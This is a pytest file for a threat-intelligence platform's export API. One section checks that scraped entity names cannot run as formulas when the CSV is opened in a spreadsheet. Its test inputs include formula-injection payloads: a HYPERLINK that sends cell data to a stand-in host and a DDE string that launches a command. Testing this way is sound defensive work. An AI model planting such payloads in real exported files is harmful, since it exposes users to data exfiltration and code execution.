from fastapi.testclient import TestClient
from intel_platform.api.app import app
from intel_platform.config import settings

client = TestClient(app)
headers = {"Authorization": f"Bearer {settings.api_key}"}

def test_export_graph():
    resp = client.get("/api/export/graph", params={"project_id": "test"}, headers=headers)
    assert resp.status_code == 200
    data = resp.json()
    assert "nodes" in data

def test_export_entities():
    resp = client.get("/api/export/entities", params={"project_id": "test"}, headers=headers)
    assert resp.status_code == 200
    data = resp.json()
    assert "csv" in data

def test_export_stix():
    resp = client.get("/api/export/stix", params={"project_id": "test"}, headers=headers)
    assert resp.status_code == 200
    data = resp.json()
    assert data["type"] == "bundle"


# ---------------------------------------------------------------------------
# A-14: entity names are scraped from the web; a spreadsheet must not run them
# ---------------------------------------------------------------------------

import csv  # noqa: E402
import io  # noqa: E402

import pytest  # noqa: E402

from intel_platform.api.deps import get_graph_store  # noqa: E402


class _ExportStore:
    def __init__(self, names):
        self.rows = [{"id": f"id-{i}", "name": n, "entity_type": "Organization"} for i, n in enumerate(names)]

    def search_entities(self, **kwargs):
        return self.rows


def _exported(names) -> list[list[str]]:
    app.dependency_overrides[get_graph_store] = lambda: _ExportStore(names)
    try:
        body = client.get("/api/export/entities", params={"project_id": "test-a14"}, headers=headers).json()
    finally:
        app.dependency_overrides.pop(get_graph_store, None)
    return list(csv.reader(io.StringIO(body["csv"])))


@pytest.mark.parametrize("name", [
    '=HYPERLINK("http://evil.example/?x="&A1,"click")',
    "+1+cmd|' /C calc'!A0",
    "-2+3",
    "@SUM(A1:A9)",
    "\t=1+1",
    "\r=1+1",
])
def test_formula_like_names_are_neutralised(name):
    header, row = _exported([name])
    assert header == ["id", "name", "entity_type"]
    assert row[1] == "'" + name


@pytest.mark.parametrize("name", [
    'Kolvane, "the holding" Ltd',
    "Line one\nline two",
    "Ordinary Name",
])
def test_names_round_trip_exactly(name):
    """Commas and quotes were rewritten to ';' and "'", corrupting real names."""
    _, row = _exported([name])
    assert row[1] == name
